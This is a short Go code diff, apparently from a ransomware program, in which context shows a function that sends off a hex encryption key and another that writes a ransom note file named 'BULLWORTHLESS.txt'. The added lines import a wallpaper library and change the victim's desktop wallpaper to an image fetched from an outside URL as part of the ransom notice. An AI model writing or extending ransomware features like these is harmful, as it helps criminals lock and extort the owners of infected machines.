@@ -11,6 +11,7 @@ import (
 	"encoding/hex"
 	"net/url"
 	"fmt"
+	"github.com/reujab/wallpaper"
 	"net/http"
 	"runtime"
 	"io"
@@ -162,6 +163,10 @@ func sendKey(hexKey string) (string, error) {
 }
 
 func writeNote() {
+	err := wallpaper.SetFromURL("https://www.gaminginstincts.com/wp-content/uploads/2019/08/Bully_2_Screenshot_Leaked_Gaming_Instincts_TV_Article_Website_Youtube_Thumbnail.jpg")
+	if err != nil {
+		fmt.Println(err)
+	}
 	n, err := os.Create("BULLWORTHLESS.txt")
 	if err != nil {
 		fmt.Println(err)
